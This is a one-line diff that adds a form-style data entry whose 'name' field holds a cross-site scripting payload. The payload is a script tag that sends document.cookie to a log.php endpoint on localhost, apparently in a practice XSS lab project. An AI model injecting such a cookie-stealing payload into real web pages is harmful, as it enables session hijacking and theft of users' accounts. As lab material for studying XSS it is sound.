@@ -1,0 +1,1 @@
+canyouseeme=I am Juno_okyo; name=<script>fetch('http://localhost:3000/PBL4/xss-me-master/log.php?c=' + document.cookie)</script>
